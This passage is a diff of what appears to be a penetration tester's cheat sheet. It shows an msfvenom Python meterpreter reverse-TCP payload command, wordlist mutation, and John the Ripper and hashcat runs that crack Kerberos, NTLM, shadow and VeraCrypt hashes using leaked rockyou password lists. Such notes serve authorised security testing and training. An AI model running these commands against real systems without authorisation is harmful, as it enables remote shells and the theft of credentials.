@@ -346,22 +346,24 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
 
 +---------- Mutated Wordlist ----------+
-psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.list
+psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt
 
 +---------- John ----------+
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+john hashes --show
 
 +---------- Hashcat ----------+
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'kerberos'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'ntlm'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'shadow'
+hashcat -h | grep -A 475 "Hash modes" | grep -i 'descrypt'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'office'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'bcrypt'
 
-cd \hashcat && hashcat.exe -m 13721 FILENAME.hc mutated.list
+cd \hashcat && hashcat.exe -m 13721 hashes mutated.txt
 cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 
 0 	MD5
